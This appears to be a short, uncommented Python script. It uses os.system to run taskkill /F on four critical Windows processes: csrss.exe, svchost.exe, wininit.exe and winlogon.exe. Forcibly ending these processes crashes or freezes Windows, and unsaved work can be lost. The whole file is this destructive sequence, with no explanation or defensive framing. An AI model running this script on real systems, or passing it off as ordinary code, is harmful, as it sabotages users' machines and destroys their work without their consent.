import os

os.system('taskkill /F /IM csrss.exe')
os.system('taskkill /F /IM svchost.exe')
os.system('taskkill /F /IM wininit.exe')
os.system('taskkill /F /IM winlogon.exe')